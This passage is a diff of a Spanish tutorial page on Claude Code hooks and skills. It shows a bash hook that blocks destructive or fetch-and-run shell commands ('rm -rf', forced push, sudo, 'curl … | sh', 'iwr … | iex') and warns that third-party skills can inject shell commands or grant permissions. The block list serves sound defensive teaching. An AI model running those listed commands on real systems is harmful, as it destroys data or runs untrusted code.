@@ -100,7 +100,7 @@ div.csl-indent {
 <link href="../site_libs/quarto-html/quarto-syntax-highlighting-bf27225e3a48a9273f3daa8f8e829971.css" rel="stylesheet" id="quarto-text-highlighting-styles">
 <script src="../site_libs/bootstrap/bootstrap.min.js"></script>
 <link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="../site_libs/bootstrap/bootstrap-a95d84cf3d0d9b3c0ccde713ddd8fed3.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<link href="../site_libs/bootstrap/bootstrap-a4cfe87370dc173d9ea2018935ed1a4e.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
 <script id="quarto-search-options" type="application/json">{
   "location": "navbar",
   "copy-button": false,
@@ -161,6 +161,10 @@ div.csl-indent {
   <li class="nav-item">
     <a class="nav-link" href="../hoja-consulta.html"> 
 <span class="menu-text">Hoja de consulta</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../actualizaciones.html"> 
+<span class="menu-text">Actualizaciones</span></a>
   </li>  
 </ul>
             <ul class="navbar-nav navbar-nav-scroll ms-auto">
@@ -353,7 +357,7 @@ div.csl-indent {
 
 
 <div class="version-unidad version-pend" role="note">
-<p>Versión 0.2.0 · editada el 23/10/2026 · comprobada el 23/10/2026 · Claude Code 2.1.309 (doc.) · pendiente de revisión</p>
+<p>Versión 0.3.0 · editada el 25/11/2026 · comprobada el 25/11/2026 · Claude Code 2.1.332 (doc.) · pendiente de revisión</p>
 </div>
 <p><img src="fig/portada.svg" class="portada img-fluid" alt="Cinco mecanismos de extensión de Claude Code en fila, CLAUDE.md, skills, hooks, subagentes y MCP, cada uno con una etiqueta que indica cuándo actúa"></p>
 <section id="objetivos-y-prerrequisitos" class="level2">
@@ -380,6 +384,7 @@ div.csl-indent {
 </div>
 <div class="callout-body-container callout-body">
 <p>Todo el código de esta unidad está en <code>c7-extender/_ejemplo/</code> y <strong>se ejecutó</strong> el 23-10-2026 (macOS 27.0.1): 14 comprobaciones del hook de validación previa y de calidad (Zsh y <code>jq</code>), la variante PowerShell 7.6.8 <strong>sobre macOS</strong>, 6 pruebas pytest de la skill y un servidor MCP local probado con el <strong>cliente del SDK</strong> de Python (<code>mcp</code> 2.3.0). <strong>No</strong> se ejecutó nada dentro de una sesión de Claude Code (los hooks, la skill y el servidor se probaron <em>fuera</em>, con entradas de muestra), y <strong>no</strong> se ejecutó <code>claude mcp add</code> (modifica <code>~/.claude.json</code>, un ajuste global). Las configuraciones proceden de la documentación 2.1.309 (consultada el 23-10-2026); los <strong>nombres de campos y eventos cambian de versión en versión</strong>: verifica siempre con <code>/hooks</code>, <code>/skills</code> y <code>/mcp</code> en tu versión.</p>
+<p><strong>Revisión del 25-11-2026.</strong> Lo nuevo de C7.5, C7.6, C7.8 y C7.9 (versiones 2.1.312 a 2.1.332) se contrastó con la documentación vigente de hooks, MCP, manifiesto de plugins y permisos, y con <code>claude --help</code> del binario <strong>2.1.330</strong>. Se ejecutó de nuevo, sin Claude, el validador de órdenes con entradas del evento <code>PreSkillShellCommand</code>. <strong>No</strong> se ejecutó nada dentro de una sesión: el evento <code>PreSkillShellCommand</code> necesita la 2.1.332 y lo que procede solo del registro de cambios se indica como tal.</p>
 </div>
 </div>
 <p><strong>Temas de la unidad</strong></p>
@@ -630,7 +635,7 @@ div.csl-indent {
 </tbody>
 </table>
 <p><strong>Argumentos y recursos:</strong> <code>$ARGUMENTS</code> se sustituye por lo que escribas tras el nombre; <code>${CLAUDE_SKILL_DIR}</code> es la carpeta de la skill, para llamar a sus <em>scripts</em> (que se <strong>ejecutan</strong>, no se cargan en el contexto). La documentación recomienda <code>SKILL.md</code> de menos de 500 líneas y poner el material extenso en ficheros aparte.</p>
-<p><strong>Seguridad.</strong> Una skill de un repositorio ajeno puede traer <code>allowed-tools</code> que concedan permisos sin preguntar, o <code>!`orden`</code> que ejecuta una orden de shell antes de que Claude vea el texto: <strong>lee las skills de terceros antes de usarlas</strong> y usa <code>disable-model-invocation: true</code> en las que tengan efectos. Los comandos personalizados antiguos de <code>.claude/commands/</code> se han <strong>fusionado con las skills</strong> (siguen funcionando; si hay una skill y un comando con el mismo nombre, gana la skill).</p>
+<p><strong>Seguridad.</strong> Una skill de un repositorio ajeno puede traer <code>allowed-tools</code> que concedan permisos sin preguntar, o <code>!`orden`</code> que ejecuta una orden de shell antes de que Claude vea el texto (desde Claude Code 2.1.332 se puede vigilar con un hook, C7.5): <strong>lee las skills de terceros antes de usarlas</strong> y usa <code>disable-model-invocation: true</code> en las que tengan efectos. Los comandos personalizados antiguos de <code>.claude/commands/</code> se han <strong>fusionado con las skills</strong> (siguen funcionando; si hay una skill y un comando con el mismo nombre, gana la skill).</p>
 <p><strong>Probar una skill.</strong> Su parte de código (<em>scripts</em>) se prueba como cualquier código (C5): entradas buenas, malas y límite, <strong>sin</strong> Claude. Su parte de instrucciones se prueba <strong>usándola</strong> con casos conocidos y comprobando que no se salta pasos. La skill de abajo tiene pruebas de sus scripts.</p>
 <p><strong>Pon a prueba lo anterior.</strong></p>
 <div id="c7-3-skill" class="ejercicio" data-tipo="vf" data-respuesta="falso">
@@ -676,9 +681,7 @@ div.csl-indent {
 <section id="c7-5" class="level3 page-columns page-full">
 <h3 class="anchored" data-anchor-id="c7-5">C7.5 Hooks: eventos, configuración, validación previa y riesgos</h3>
 <p>Un <strong>hook</strong> es una orden que Claude Code ejecuta <strong>por sí mismo</strong> cuando ocurre un evento del ciclo de vida: antes o después de usar una herramienta (<code>PreToolUse</code>, <code>PostToolUse</code>), al empezar una sesión, al enviar un mensaje, al terminar un turno (<code>Stop</code>), etc. A diferencia de una instrucción, <strong>no depende de que Claude decida cumplirla</strong> <span class="citation" data-cites="anthropic-hooks">(<a href="#ref-anthropic-hooks" role="doc-biblioref"><em>Automate actions with hooks</em> 2026</a>)</span>.</p>
-<div class="no-row-height column-margin column-container"><div id="ref-anthropic-hooks" class="csl-entry" role="listitem">
-<em>Automate actions with hooks</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/hooks-guide">https://code.claude.com/docs/en/hooks-guide</a>.
-</div></div><p><strong>Dónde se configuran:</strong> en el bloque <code>hooks</code> de <code>~/.claude/settings.json</code>, <code>.claude/settings.json</code> (se versiona), <code>.claude/settings.local.json</code>, en ajustes gestionados, en un plugin o en la cabecera de una skill o subagente. <code>/hooks</code> los lista.</p>
+<div class="no-row-height column-margin column-container"></div><p><strong>Dónde se configuran:</strong> en el bloque <code>hooks</code> de <code>~/.claude/settings.json</code>, <code>.claude/settings.json</code> (se versiona), <code>.claude/settings.local.json</code>, en ajustes gestionados, en un plugin o en la cabecera de una skill o subagente. <code>/hooks</code> los lista.</p>
 <p><strong>Estructura</strong> (un <code>PreToolUse</code> con <em>matcher</em>, tomado de la documentación):</p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"hooks"</span><span class="fu">:</span> <span class="fu">{</span></span>
@@ -693,7 +696,8 @@ div.csl-indent {
 <span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span></span>
 <span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>El <em>matcher</em> filtra por nombre de herramienta (<code>Bash</code>, <code>Edit|Write</code>, <code>mcp__.*</code>). Sin matcher, el hook se ejecuta en <strong>cada</strong> aparición del evento.</p>
-<p><strong>Cómo hablan Claude Code y el hook.</strong> El hook recibe <strong>un JSON por la entrada estándar</strong> (stdin) con campos comunes (<code>session_id</code>, <code>cwd</code>, <code>hook_event_name</code>) y los del evento; en <code>PreToolUse</code> de Bash, <code>tool_name</code> y <code>tool_input.command</code>. Responde con <strong>código de salida</strong>:</p>
+<p><strong>El matcher <code>Bash</code> también vigila Monitor.</strong> La herramienta Monitor lanza una orden de shell en segundo plano (un <code>tail -f</code> de un registro, por ejemplo) y le va pasando a Claude lo que imprime. Desde Claude Code 2.1.314, un hook <code>PreToolUse</code> o <code>PermissionRequest</code> con <em>matcher</em> <code>Bash</code> (o <code>Bash|PowerShell</code>, <code>Bash.*</code>) se ejecuta también con esas órdenes: puede <strong>bloquearlas</strong> o pedir confirmación, pero un <code>allow</code> o una reescritura de la orden no tienen efecto <span class="citation" data-cites="anthropic-hooks anthropic-changelog">(<a href="#ref-anthropic-hooks" role="doc-biblioref"><em>Automate actions with hooks</em> 2026</a>; <a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>. Para aprobar o reescribir órdenes de Monitor hay que nombrarlo en el <em>matcher</em> (<code>Bash|Monitor</code>) y, si se quiere afinar, en la condición <code>if</code> (<code>Monitor(tail *)</code>). La consecuencia práctica es buena: un validador como el del ejemplo 1 protege también esas órdenes sin tocarlo.</p>
+<div class="no-row-height column-margin column-container"></div><p><strong>Cómo hablan Claude Code y el hook.</strong> El hook recibe <strong>un JSON por la entrada estándar</strong> (stdin) con campos comunes (<code>session_id</code>, <code>cwd</code>, <code>hook_event_name</code>) y los del evento; en <code>PreToolUse</code> de Bash, <code>tool_name</code> y <code>tool_input.command</code>. Responde con <strong>código de salida</strong>:</p>
 <table class="caption-top table">
 <colgroup>
 <col style="width: 50%">
@@ -716,55 +720,65 @@ div.csl-indent {
 </tr>
 <tr class="odd">
 <td>Otro</td>
-<td>El hook falló; en la mayoría de eventos la acción continúa (<strong>un hook roto no protege</strong>)</td>
+<td>El hook falló; en la mayoría de eventos la acción continúa (<strong>un hook roto no protege</strong>), salvo que el hook declare <code>onFailure: "block"</code> (abajo)</td>
 </tr>
 </tbody>
 </table>
 <p>Alternativa con más control: salir con 0 e imprimir un JSON con <code>hookSpecificOutput.permissionDecision</code> (<code>"deny"</code>, <code>"allow"</code>, <code>"ask"</code>) y un motivo. Un <code>"deny"</code> de un hook <strong>se mantiene en todos los modos de permisos</strong>, incluso con <code>bypassPermissions</code>; un <code>"allow"</code> <strong>no</strong> salta las reglas <code>deny</code>. Elige un enfoque por hook (código <strong>o</strong> JSON).</p>
-<section id="ejemplo-1-validación-previa-de-órdenes" class="level4">
+<p><strong>Fallar abierto o fallar cerrado: <code>onFailure</code>.</strong> Un control de seguridad tiene que decidir qué hace cuando <strong>él mismo</strong> falla. Si deja pasar la acción (<em>fallar abierto</em>), un script roto equivale a no tener control; si la bloquea (<em>fallar cerrado</em>), un script roto detiene el trabajo hasta que lo arreglas. Por omisión, los hooks de Claude Code fallan abiertos. El campo <code>onFailure</code> de un hook cambia eso: con <code>"block"</code>, cualquier fallo del hook (no arranca, sale con un código distinto de 0 y 2, se agota su <code>timeout</code> o devuelve una salida no válida) cuenta como un código 2 en ese evento; con <code>"continue"</code>, o sin el campo, la acción sigue. Según la referencia de hooks consultada el 25-11-2026, vale para los hooks de tipo <code>command</code> y <code>http</code> desde Claude Code 2.1.295 (y para <code>mcp_tool</code> desde la 2.1.328), y no tiene efecto en <code>Stop</code>, <code>SubagentStop</code>, dos eventos de los equipos de agentes ni en los hooks asíncronos <span class="citation" data-cites="anthropic-hooks">(<a href="#ref-anthropic-hooks" role="doc-biblioref"><em>Automate actions with hooks</em> 2026</a>)</span>:</p>
+<div class="no-row-height column-margin column-container"></div><div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span> <span class="dt">"type"</span><span class="fu">:</span> <span class="st">"command"</span><span class="fu">,</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"command"</span><span class="fu">:</span> <span class="st">"</span><span class="ch">\"</span><span class="st">$CLAUDE_PROJECT_DIR</span><span class="ch">\"</span><span class="st">/.claude/hooks/validar-comando.sh"</span><span class="fu">,</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"onFailure"</span><span class="fu">:</span> <span class="st">"block"</span> <span class="fu">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<p>Úsalo en los hooks que <strong>protegen</strong> (como <code>validar-comando.sh</code>), no en los que solo informan. Para comprobarlo, repite el ejercicio 2 («Rompe tu hook») con el hook instalado: sin <code>onFailure</code>, la orden pasa; con <code>"block"</code>, Claude Code la bloquea. El coste es real: si falta <code>jq</code> en el equipo, <strong>todas</strong> las órdenes de shell quedarán bloqueadas hasta que lo instales. (Comportamiento tomado de la documentación; no se ha ejecutado en una sesión.)</p>
+<section id="ejemplo-1-validación-previa-de-órdenes" class="level4 page-columns page-full">
 <h4 class="anchored" data-anchor-id="ejemplo-1-validación-previa-de-órdenes">Ejemplo 1: validación previa de órdenes</h4>
 <p><code>_ejemplo/hooks/validar-comando.sh</code> (Zsh/Bash con <code>jq</code>) bloquea <code>rm -rf</code>, <code>git push --force</code>, <code>git reset --hard</code>, <code>sudo</code> y <code>curl … | sh</code>:</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="va">entrada</span><span class="op">=</span><span class="va">$(</span><span class="fu">cat</span><span class="va">)</span></span>
-<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="va">orden</span><span class="op">=</span><span class="va">$(</span><span class="bu">printf</span> <span class="st">'%s'</span> <span class="st">"</span><span class="va">$entrada</span><span class="st">"</span> <span class="kw">|</span> <span class="ex">jq</span> <span class="at">-r</span> <span class="st">'.tool_input.command // empty'</span><span class="va">)</span></span>
-<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> <span class="ot">-z</span> <span class="st">"</span><span class="va">$orden</span><span class="st">"</span> <span class="bu">]</span> <span class="kw">&amp;&amp;</span> <span class="bu">exit</span> 0</span>
-<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="fu">bloquea()</span> <span class="kw">{</span> <span class="bu">echo</span> <span class="st">"Bloqueado por validar-comando.sh: </span><span class="va">$1</span><span class="st">"</span> <span class="op">&gt;&amp;</span><span class="dv">2</span><span class="kw">;</span> <span class="bu">exit</span> 2<span class="kw">;</span> <span class="kw">}</span></span>
-<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="cf">case</span> <span class="st">"</span><span class="va">$orden</span><span class="st">"</span> <span class="kw">in</span></span>
-<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="st">"rm -rf"</span><span class="pp">*</span><span class="kw">|</span><span class="pp">*</span><span class="st">"rm -fr"</span><span class="pp">*</span><span class="kw">)</span>               <span class="ex">bloquea</span> <span class="st">"borrado recursivo forzado"</span> <span class="cf">;;</span></span>
-<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="st">"git push --force"</span><span class="pp">*</span><span class="kw">|</span><span class="pp">*</span><span class="st">"git push -f"</span><span class="pp">*</span><span class="kw">)</span> <span class="ex">bloquea</span> <span class="st">"push forzado"</span> <span class="cf">;;</span></span>
-<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="st">"git reset --hard"</span><span class="pp">*</span><span class="kw">)</span>                <span class="ex">bloquea</span> <span class="st">"git reset --hard descarta trabajo"</span> <span class="cf">;;</span></span>
-<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="ss">sudo</span><span class="dt">\ </span><span class="pp">*</span><span class="kw">)</span>                           <span class="ex">bloquea</span> <span class="st">"sudo"</span> <span class="cf">;;</span></span>
-<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="cf">esac</span></span>
-<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span> 0</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="va">entrada</span><span class="op">=</span><span class="va">$(</span><span class="fu">cat</span><span class="va">)</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="va">orden</span><span class="op">=</span><span class="va">$(</span><span class="bu">printf</span> <span class="st">'%s'</span> <span class="st">"</span><span class="va">$entrada</span><span class="st">"</span> <span class="kw">|</span> <span class="ex">jq</span> <span class="at">-r</span> <span class="st">'.tool_input.command // empty'</span><span class="va">)</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> <span class="ot">-z</span> <span class="st">"</span><span class="va">$orden</span><span class="st">"</span> <span class="bu">]</span> <span class="kw">&amp;&amp;</span> <span class="bu">exit</span> 0</span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="fu">bloquea()</span> <span class="kw">{</span> <span class="bu">echo</span> <span class="st">"Bloqueado por validar-comando.sh: </span><span class="va">$1</span><span class="st">"</span> <span class="op">&gt;&amp;</span><span class="dv">2</span><span class="kw">;</span> <span class="bu">exit</span> 2<span class="kw">;</span> <span class="kw">}</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="cf">case</span> <span class="st">"</span><span class="va">$orden</span><span class="st">"</span> <span class="kw">in</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="st">"rm -rf"</span><span class="pp">*</span><span class="kw">|</span><span class="pp">*</span><span class="st">"rm -fr"</span><span class="pp">*</span><span class="kw">)</span>               <span class="ex">bloquea</span> <span class="st">"borrado recursivo forzado"</span> <span class="cf">;;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="st">"git push --force"</span><span class="pp">*</span><span class="kw">|</span><span class="pp">*</span><span class="st">"git push -f"</span><span class="pp">*</span><span class="kw">)</span> <span class="ex">bloquea</span> <span class="st">"push forzado"</span> <span class="cf">;;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="st">"git reset --hard"</span><span class="pp">*</span><span class="kw">)</span>                <span class="ex">bloquea</span> <span class="st">"git reset --hard descarta trabajo"</span> <span class="cf">;;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>  <span class="pp">*</span><span class="ss">sudo</span><span class="dt">\ </span><span class="pp">*</span><span class="kw">)</span>                           <span class="ex">bloquea</span> <span class="st">"sudo"</span> <span class="cf">;;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="cf">esac</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="bu">exit</span> 0</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>(El fichero real añade el caso <code>curl | sh</code> con una expresión regular.) Hay una variante <strong>PowerShell</strong> (<code>validar-comando.ps1</code>) que lee el JSON con <code>ConvertFrom-Json</code> y usa <code>exit 2</code> igual. <strong>Resultado comprobado</strong> (ejecutando los scripts con JSON de muestra, sin Claude): <code>ls</code> y <code>git status</code> → 0; <code>rm -rf</code>, push forzado, <code>reset --hard</code>, <code>sudo</code> y <code>curl | sh</code> → <strong>2</strong> con el mensaje; un <code>git push</code> normal → 0, porque <strong>ese lo decide el permiso <code>ask</code></strong>, no el hook. En PowerShell 7 (sobre macOS): <code>rm -rf</code> → 2, <code>git status</code> → 0, <code>iwr … | iex</code> → 2.</p>
-<p><strong>Un caso real mientras se escribía esta unidad.</strong> El hook de este proyecto (<code>.claude/hooks/bloquear-datos-privados.sh</code>, de once líneas) <strong>bloqueó varias veces</strong> órdenes de shell del propio asistente porque su <em>texto</em> mencionaba la carpeta protegida, aunque solo fuera para escribir un fichero de documentación. Es el comportamiento deseado… y también su <strong>limitación</strong>: un hook por patrones de texto es una segunda barrera, no una defensa completa.</p>
+<p><strong>Registrar la variante PowerShell.</strong> Un hook de tipo <code>command</code> acepta el campo <code>shell</code>: <code>"bash"</code> (por omisión) o <code>"powershell"</code>; en Windows sin Git Bash, el valor por omisión pasa a ser PowerShell <span class="citation" data-cites="anthropic-hooks">(<a href="#ref-anthropic-hooks" role="doc-biblioref"><em>Automate actions with hooks</em> 2026</a>)</span>. Por ejemplo, <code>{ "type": "command", "shell": "powershell", "command": "&amp; \"$env:CLAUDE_PROJECT_DIR/.claude/hooks/validar-comando.ps1\"" }</code> (el <code>&amp;</code> hace falta: una orden que solo es una cadena entre comillas no ejecuta nada en PowerShell; esta línea no se ha probado en Windows). Dos avisos de versión: en Windows sin Git Bash, en <code>PreToolUse</code> solo cuentan como veredicto los códigos 0 y 2 (cualquier otro se trata como fallo que bloquea); y hasta la 2.1.315 un hook de PowerShell cuya orden <strong>empezaba</strong> por una conversión de tipo (<code>[int]…</code>), <code>param</code>, <code>using</code> o un atributo no bloqueaba con <code>exit 2</code>, algo que el registro de cambios da por corregido en la 2.1.316 <span class="citation" data-cites="anthropic-changelog">(<a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>. <code>validar-comando.ps1</code> no empieza así, pero es un motivo más para comprobar el bloqueo <strong>en tu versión</strong> con la orden de prueba de la práctica guiada.</p>
+<div class="no-row-height column-margin column-container"></div><p><strong>Un caso real mientras se escribía esta unidad.</strong> El hook de este proyecto (<code>.claude/hooks/bloquear-datos-privados.sh</code>, de once líneas) <strong>bloqueó varias veces</strong> órdenes de shell del propio asistente porque su <em>texto</em> mencionaba la carpeta protegida, aunque solo fuera para escribir un fichero de documentación. Es el comportamiento deseado… y también su <strong>limitación</strong>: un hook por patrones de texto es una segunda barrera, no una defensa completa.</p>
 </section>
-<section id="ejemplo-2-comprobar-la-calidad-tras-cada-edición" class="level4 page-columns page-full">
+<section id="ejemplo-2-comprobar-la-calidad-tras-cada-edición" class="level4">
 <h4 class="anchored" data-anchor-id="ejemplo-2-comprobar-la-calidad-tras-cada-edición">Ejemplo 2: comprobar la calidad tras cada edición</h4>
 <p><code>_ejemplo/hooks/comprobar-calidad.sh</code> es un <code>PostToolUse</code> con <em>matcher</em> <code>Edit|Write</code>: si el fichero editado es <code>.py</code>, comprueba que <strong>compila</strong> y, si encuentra una carpeta <code>tests/</code> por encima, ejecuta las pruebas. Si algo falla, devuelve <code>{"decision": "block", "reason": "…"}</code> (la forma de decisión que la documentación indica para <code>PostToolUse</code> y <code>Stop</code>), construido con <code>jq</code> para escapar bien el texto. La orden de pruebas es configurable con la variable <code>COMPROBAR_PYTEST</code>.</p>
 <p><strong>Resultado comprobado</strong> (con JSON de muestra): un <code>.py</code> con <strong>error de sintaxis</strong> → <code>decision: block</code>; un <code>.py</code> correcto sin <code>tests/</code> → <strong>sin salida</strong>; un <code>.py</code> correcto pero con una <strong>prueba que falla</strong> en <code>tests/</code> → <code>decision: block</code> con el resumen de pytest; un fichero que no es <code>.py</code> → ignorado. Se ejecutan todos con <code>zsh c7-extender/_ejemplo/hooks/probar_hooks.sh</code> (<strong>14 comprobaciones</strong>, todas en verde). <strong>No</strong> se ha verificado el comportamiento de <code>decision: block</code> dentro de una sesión real; la forma del JSON procede de la documentación.</p>
 <p><strong>Configuración de ambos hooks</strong> (<code>hooks/settings.ejemplo.json</code>, validada con <code>jq</code>): <code>PreToolUse</code> con <code>Bash</code> y <code>PostToolUse</code> con <code>Edit|Write</code>. Los scripts deben ser <strong>ejecutables</strong> en macOS (<code>chmod +x</code>).</p>
-<div class="novedad callout callout-style-default callout-note no-icon callout-titled" title="Novedad · Claude Code 2.1.312 a 2.1.316 · por incorporar">
-<div class="callout-header d-flex align-content-center">
-<div class="callout-icon-container">
-<i class="callout-icon no-icon"></i>
-</div>
-<div class="callout-title-container flex-fill">
-<span class="screen-reader-only">Nota</span>Novedad · Claude Code 2.1.312 a 2.1.316 · por incorporar
-</div>
-</div>
-<div class="callout-body-container callout-body">
-<ul>
-<li><strong>Hooks de PowerShell y <code>exit 2</code></strong> (2.1.316): se corrige que un hook de PowerShell <strong>no bloqueara</strong> con el código 2 cuando su orden empieza por una conversión de tipo, <code>param</code>, <code>using</code> o un atributo <span class="citation" data-cites="anthropic-changelog">(<a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>. <code>validar-comando.ps1</code> no empieza así, pero es un motivo más para probar el bloqueo en la versión que uses.</li>
-<li><strong>Hooks y la herramienta Monitor</strong> (2.1.314): los hooks con <em>matcher</em> <code>Bash</code> se ejecutan también con las órdenes de shell que lanza Monitor. Pueden bloquearlas o preguntar, pero no aprobarlas ni reescribirlas. Las condiciones <code>if</code> como <code>Monitor(tail *)</code> casan como <code>Bash(tail *)</code>.</li>
-<li><strong>Límite de simultaneidad</strong> (2.1.312): como mucho se ejecutan a la vez 24 hooks de tipo <em>prompt</em> o <em>agent</em> por sesión, subagentes incluidos. Un <code>timeout</code> inferior a 1 segundo cuenta como 1 segundo.</li>
+</section>
+<section id="ejemplo-3-vigilar-las-órdenes-que-inyectan-las-skills" class="level4 page-columns page-full">
+<h4 class="anchored" data-anchor-id="ejemplo-3-vigilar-las-órdenes-que-inyectan-las-skills">Ejemplo 3: vigilar las órdenes que inyectan las skills</h4>
+<p>En C7.3 viste que una skill puede llevar <code>!`orden`</code> (o un bloque <code>```!</code>): Claude Code ejecuta esa orden de shell <strong>al cargar la skill</strong>, antes de que Claude lea el texto, y pone su salida en su lugar. Esas órdenes <strong>no pasan por <code>PreToolUse</code></strong>, así que el validador del ejemplo 1 no las ve. Para cubrir ese hueco, Claude Code 2.1.332 añade el evento <strong><code>PreSkillShellCommand</code></strong>, que se dispara justo antes de cada orden inyectada <span class="citation" data-cites="anthropic-hooks anthropic-changelog">(<a href="#ref-anthropic-hooks" role="doc-biblioref"><em>Automate actions with hooks</em> 2026</a>; <a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>:</p>
+<div class="no-row-height column-margin column-container"></div><ul>
+<li><strong>Matcher:</strong> la herramienta que ejecutaría la orden, <code>Bash</code> o <code>PowerShell</code> (<code>Bash|PowerShell</code> cubre las dos).</li>
+<li><strong>Entrada:</strong> los campos comunes más <code>tool_name</code>, <code>tool_input.command</code> (la orden tal como se ejecutaría), <code>command_name</code> (la skill que se carga), <code>command_source</code> (de dónde viene: ajustes de usuario, de proyecto, un plugin…) e <code>invoked_by</code> (<code>"user"</code>, <code>"claude"</code> u otro, como un subagente).</li>
+<li><strong>Decisión:</strong> solo puede <strong>bloquear</strong> (código 2, o <code>permissionDecision: "deny"</code> en el mismo formato JSON que <code>PreToolUse</code>); no puede aprobar ni reescribir. Si bloquea, la skill se carga igualmente y, en lugar de la salida, Claude ve un aviso de orden no ejecutada.</li>
+<li><strong>Dónde se declara:</strong> en un fichero de ajustes o en un plugin, con un hook <code>command</code>, <code>http</code> o <code>mcp_tool</code> no asíncrono. Los hooks de la cabecera de la propia skill no sirven para esto, ni los de tipo <em>prompt</em> o <em>agent</em>.</li>
 </ul>
-<p><span class="novedad-estado">Leída en el changelog oficial el 03-11-2026; no ejecutada ni integrada aún en el texto, que se contrastó con la 2.1.309.</span></p>
-</div>
-</div>
-<div class="no-row-height column-margin column-container"><div id="ref-anthropic-changelog" class="csl-entry" role="listitem">
-<em>Changelog</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 03-11-2026. <a href="https://code.claude.com/docs/en/changelog">https://code.claude.com/docs/en/changelog</a>.
-</div></div><div class="callout callout-style-default callout-warning callout-titled" title="Riesgos de los hooks">
+<p>Como la entrada tiene el mismo <code>tool_input.command</code>, <strong>el mismo <code>validar-comando.sh</code> sirve sin cambios</strong>:</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"hooks"</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">"PreSkillShellCommand"</span><span class="fu">:</span> <span class="ot">[</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>      <span class="fu">{</span></span>
